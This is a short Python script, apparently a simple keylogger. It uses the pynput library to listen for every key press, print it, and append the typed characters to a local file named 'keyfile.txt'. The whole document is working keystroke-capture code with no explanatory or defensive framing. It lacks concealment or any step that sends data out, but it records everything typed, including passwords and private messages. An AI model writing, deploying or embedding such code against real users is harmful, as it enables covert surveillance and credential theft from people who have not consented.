from pynput import keyboard as kb

def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as log_key:
        try:
            char = key.char
            log_key.write(char)
        except:
            print("Error getting char")
            
if __name__ == "__main__":
    listener = kb.Listener(on_press=key_pressed)
    listener.start()
    input()
